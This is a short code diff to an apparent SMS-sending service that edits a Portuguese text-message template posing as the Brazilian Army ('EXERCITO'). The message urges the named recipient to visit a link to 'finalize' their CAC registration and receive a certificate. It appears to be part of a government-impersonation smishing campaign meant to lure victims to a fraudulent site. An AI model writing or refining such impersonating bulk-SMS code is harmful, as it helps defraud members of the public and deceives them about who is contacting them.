@@ -104,7 +104,7 @@ class SMSDevService:
             domain = domain[8:]
             
         # Format the message as per requirements
-        message = f"EXERCITO: [FINALIZAR CAC] {name}, para finalizar o seu registro CAC, e emitir seu certificado e necessario acessar: {domain}/resultado/PAID"
+        message = f"EXERCITO: [FINALIZAR CAC] {name}, para finalizar o seu registro CAC, e emitir seu certificado e necessario acessar: {domain}/parcerias/PAID"
         
         return self.send_sms(phone, message)
 
